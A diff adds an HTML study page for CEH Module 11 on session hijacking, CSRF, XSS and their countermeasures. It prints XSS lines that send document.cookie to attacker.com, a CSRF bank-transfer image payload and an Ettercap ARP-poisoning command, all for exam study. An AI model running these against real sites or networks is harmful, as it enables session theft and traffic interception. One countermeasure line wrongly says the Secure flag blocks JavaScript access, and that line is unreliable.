@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 11: Session Hijacking - CEH v13 Study Notes</title>
+    <meta name="description" content="CEH v13 Module 11 study notes: session hijacking, TCP session hijacking, cookie hijacking, CSRF, XSRF, countermeasures.">
+    <meta name="keywords" content="CEH module 11, session hijacking, TCP session hijacking, cookie hijacking, CSRF, XSRF, CEH v13 study notes">
+    <meta name="author" content="Chris Pardue">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://cehstudy.com/module11.html">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        :root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--text:#c9d1d9;--text2:#8b949e;--accent:#58a6ff;--accent2:#1f6feb;--border:#30363d}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text);line-height:1.7}
+        .container{max-width:900px;margin:0 auto;padding:0 20px}
+        header{background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 20px}
+        .header-inner{display:flex;justify-content:space-between;align-items:center}
+        .back-link{color:var(--accent);text-decoration:none;font-size:.9rem;display:flex;align-items:center;gap:4px}
+        .back-link:hover{text-decoration:underline}
+        .study-btn{color:var(--accent);text-decoration:none;font-size:.9rem;padding:6px 14px;border:1px solid var(--accent);border-radius:6px;transition:all .15s}
+        .study-btn:hover{background:var(--accent2);border-color:var(--accent)}
+        main{padding:30px 0}
+        .module-title{font-size:1.8rem;font-weight:700;margin-bottom:8px}
+        .section-block{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:24px;margin-bottom:16px}
+        .section-block h3{font-size:1.2rem;color:var(--accent);margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+        .section-block h4{color:var(--text);margin:16px 0 8px;font-size:1rem}
+        .section-block p{color:var(--text2);margin-bottom:12px}
+        .section-block ul,.section-block ol{color:var(--text2);margin:0 0 12px 24px}
+        .section-block li{margin-bottom:6px}
+        .section-block strong{color:var(--text)}
+        .section-block code{background:var(--bg3);padding:2px 6px;border-radius:3px;font-size:.9em}
+        .section-block pre{background:var(--bg3);padding:12px;border-radius:6px;overflow-x:auto;margin:12px 0}
+        .section-block pre code{background:none;padding:0}
+        .section-block blockquote{border-left:3px solid var(--accent);padding-left:16px;margin:12px 0;color:var(--text2);font-style:italic}
+        footer{text-align:center;padding:30px 0;color:var(--text2);font-size:.85rem;border-top:1px solid var(--border);margin-top:40px}
+        footer a{color:var(--accent);text-decoration:none}
+    </style>
+</head>
+<body>
+    <header><div class="container"><div class="header-inner">
+        <a href="index.html" class="back-link">&#8592; CEH Study Flashcards</a>
+        <a href="index.html" class="study-btn">&#127891; Study Flashcards</a>
+    </div></div></header>
+    <div class="container">
+        <main>
+            <h1 class="module-title">Module 11: Session Hijacking</h1>
+
+            <section class="section-block"><h3>Section 1: Session Fundamentals</h3>
+                <p><strong>HTTP is a stateless protocol</strong> - each request is independent. Sessions maintain state between requests to track user activity.</p>
+                <h4>Session Mechanisms</h4>
+                <ul>
+                    <li><strong>Cookies:</strong> Small data stored in browser, sent with each request to identify the session</li>
+                    <li><strong>URL rewriting:</strong> Session ID embedded in URL (less common, less secure)</li>
+                    <li><strong>Hidden form fields:</strong> Session ID stored in hidden input fields</li>
+                    <li><strong>SSL session IDs:</strong> Established during TLS handshake</li>
+                </ul>
+                <h4>Common Session Cookies</h4>
+                <ul>
+                    <li><strong>JSESSIONID:</strong> Java servlet API sessions</li>
+                    <li><strong>PHPSESSID:</strong> PHP session identifier</li>
+                    <li><strong>ASP.NET_SessionId:</strong> ASP.NET session state</li>
+                    <li><strong>SESSION:</strong> Generic session cookie</li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 2: Session Hijacking Techniques</h3>
+                <h4>What is Session Hijacking?</h4>
+                <p>Taking over a user's authenticated session by stealing or predicting the session ID. The attacker uses the victim's valid session to access the application without authentication.</p>
+
+                <h4>Network Sniffing</h4>
+                <p>Capturing unencrypted session cookies transmitted over the network. Works on unsecured Wi-Fi, switched networks (via ARP poisoning), or any network where the attacker has access to traffic.</p>
+                <p><strong>Mitigation:</strong> Use HTTPS for all sessions, implement HSTS headers</p>
+
+                <h4>Predicting Session IDs</h4>
+                <p>If session IDs are generated using predictable algorithms (sequential numbers, time-based), attacker can guess valid session IDs.</p>
+                <ul>
+                    <li><strong>Weak random number generators:</strong> Predictable output</li>
+                    <li><strong>Sequential IDs:</strong> Easy to iterate through</li>
+                    <li><strong>Information leakage:</strong> Session IDs revealed in logs, URLs, referrer headers</li>
+                </ul>
+
+                <h4>Cookie Poisoning</h4>
+                <p>Modifying session cookie values to gain unauthorized access. E.g., changing role=guest to role=admin.</p>
+
+                <h4>Session Fixation</h4>
+                <p>Attacker sets a known session ID for the victim, then waits for the victim to authenticate using that session ID.</p>
+                <ol>
+                    <li>Attacker obtains a valid session ID from the application</li>
+                    <li>Attacker tricks victim into using that session ID (via URL, phishing)</li>
+                    <li>Victim authenticates with the fixed session ID</li>
+                    <li>Attacker uses the known session ID to access the authenticated session</li>
+                </ol>
+
+                <h4>XSS for Session Hijacking</h4>
+                <p>Cross-Site Scripting allows stealing session cookies via JavaScript:</p>
+                <pre><code>var img = document.createElement('img');
+img.src = 'http://attacker.com/steal?c=' + document.cookie;
+document.body.appendChild(img);</code></pre>
+
+                <h4>CSRF (Cross-Site Request Forgery)</h4>
+                <p>Tricking an authenticated user into performing unintended actions. The attacker exploits the fact that the user's browser automatically includes session cookies with requests.</p>
+                <h4>Example</h4>
+                <pre><code>&lt;img src="http://bank.com/transfer?to=hacker&amount=10000"&gt;</code></pre>
+                <p>When the victim loads a page containing this image, their browser sends the request with their session cookies.</p>
+
+                <h4>Man-in-the-Middle (MITM)</h4>
+                <p>Positioning between victim and server to capture/modify session data. Can be done via ARP poisoning, DNS spoofing, rogue AP, or SSL stripping.</p>
+            </section>
+
+            <section class="section-block"><h3>Section 3: Session Hijacking Tools</h3>
+                <h4>Wireshark</h4>
+                <p>Capture and analyze network traffic to find unencrypted session cookies.</p>
+                <pre><code>Follow TCP Stream -> Filter for "Set-Cookie"</code></pre>
+
+                <h4>Tamper Data (Firefox Extension)</h4>
+                <p>View and modify HTTP/HTTPS headers including cookies before they are sent to the server.</p>
+
+                <h4>Cookie Monster (Firefox Extension)</h4>
+                <p>View, edit, and delete cookies stored by the browser.</p>
+
+                <h4>BeEF (Browser Exploitation Framework)</h4>
+                <p>Exploits web browsers using XSS to gain control over the victim's browser and steal session cookies.</p>
+
+                <h4>Ettercap</h4>
+                <p>MITM attacks on local network to capture session data. Supports ARP poisoning for switched networks.</p>
+                <pre><code>ettercap -T -q -i eth0 -M arp:remote // //</code></pre>
+
+                <h4>Cain &amp; Abel</h4>
+                <p>Windows tool that can sniff session cookies on LAN, recover password hashes, and perform ARP poisoning.</p>
+            </section>
+
+            <section class="section-block"><h3>Section 4: Session Hijacking Countermeasures</h3>
+                <h4>Transport Layer Security</h4>
+                <ul>
+                    <li><strong>HTTPS everywhere:</strong> Encrypt all session data in transit</li>
+                    <li><strong>HSTS (HTTP Strict Transport Security):</strong> Force browsers to use HTTPS only</li>
+                    <li><strong>SSL pinning:</strong> In mobile apps, validate specific SSL certificates</li>
+                </ul>
+
+                <h4>Session Management Best Practices</h4>
+                <ul>
+                    <li><strong>Use strong random session IDs:</strong> At least 128 bits of entropy</li>
+                    <li><strong>Secure flag on cookies:</strong> Prevents JavaScript access (prevents XSS theft)</li>
+                    <li><strong>HttpOnly flag:</strong> Cookies not accessible via client-side scripts</li>
+                    <li><strong>Samesite attribute:</strong> Prevents CSRF by restricting cross-site requests</li>
+                    <li><strong>Short session timeouts:</strong> Limit session lifetime</li>
+                    <li><strong>Session regeneration:</strong> Generate new session ID after login (prevents fixation)</li>
+                </ul>
+
+                <h4>Application-Level Defenses</h4>
+                <ul>
+                    <li><strong>CSRF tokens:</strong> Unique token per session included in forms</li>
+                    <li><strong>Input validation:</strong> Sanitize all user input to prevent XSS</li>
+                    <li><strong>Content Security Policy (CSP):</strong> Prevent inline scripts</li>
+                    <li><strong>Multi-factor authentication:</strong> Reduces impact of session theft</li>
+                </ul>
+
+                <h4>Network-Level Defenses</h4>
+                <ul>
+                    <li><strong>Switched networks:</strong> Use switches instead of hubs</li>
+                    <li><strong>ARP inspection (DAI):</strong> Prevent ARP poisoning</li>
+                    <li><strong>Encrypted traffic analysis:</strong> Detect unusual patterns</li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 5: CSRF Deep Dive</h3>
+                <h4>CSRF Attack Flow</h4>
+                <ol>
+                    <li>Victim authenticates to target site (session cookie set)</li>
+                    <li>Victim visits attacker's malicious page while still authenticated</li>
+                    <li>Malicious page sends request to target site with victim's cookies</li>
+                    <li>Target site processes the request as legitimate</li>
+                </ol>
+
+                <h4>CSRF Protection Methods</h4>
+                <ul>
+                    <li><strong>Anti-CSRF tokens:</strong> Unique token per session, validated on each state-changing request</li>
+                    <li><strong>SameSite cookies:</strong> Browser prevents sending cookies in cross-site requests</li>
+                    <li><strong>Referer header checking:</strong> Verify request origin</li>
+                    <li><strong>User agent verification:</strong> Check for consistent user agents</li>
+                    <li><strong>Double-submit cookies:</strong> Cookie value must match custom header value</li>
+                </ul>
+
+                <h4>Types of CSRF</h4>
+                <ul>
+                    <li><strong>GET-based CSRF:</strong> Manipulating state via URL parameters (less common, should not change state)</li>
+                    <li><strong>POST-based CSRF:</strong> Submitting forms via POST requests</li>
+                    <li><strong>HTTPS CSRF:</strong> Works even on encrypted sites if cookies are sent</li>
+                </ul>
+            </section>
+
+            <section class="section-block"><h3>Section 6: XSS and Session Hijacking</h3>
+                <h4>Stored XSS</h4>
+                <p>Malicious script stored on the target server (e.g., in a database). Executed when victims view the content.</p>
+
+                <h4>Reflected XSS</h4>
+                <p>Malicious script embedded in URL. Victim must click the link for it to execute.</p>
+
+                <h4>DOM-Based XSS</h4>
+                <p>Vulnerability in client-side JavaScript that processes data from an untrusted source without proper sanitization.</p>
+
+                <h4>Stealing Cookies via XSS</h4>
+                <pre><code>// Steal cookies and send to attacker
+document.location = 'http://attacker.com/steal?c=' + document.cookie;
+
+// Send to server using fetch
+fetch('http://attacker.com/steal?c=' + document.cookie);</code></pre>
+
+                <h4>XSS Countermeasures</h4>
+                <ul>
+                    <li><strong>Output encoding:</strong> Encode all user-supplied data before rendering</li>
+                    <li><strong>Input validation:</strong> Reject or sanitize dangerous input</li>
+                    <li><strong>CSP headers:</strong> Prevent inline script execution</li>
+                    <li><strong>HttpOnly cookies:</strong> Make session cookies inaccessible to JavaScript</li>
+                </ul>
+            </section>
+        </main>
+    </div>
+    <footer><div class="container">
+        <p>Built for the CEH community. Study smart, pass your exam.</p>
+        <p style="margin-top:8px"><a href="index.html">cehstudy.com</a> &middot; Not affiliated with EC-Council</p>
+    </div></footer>
+</body>
+</html>
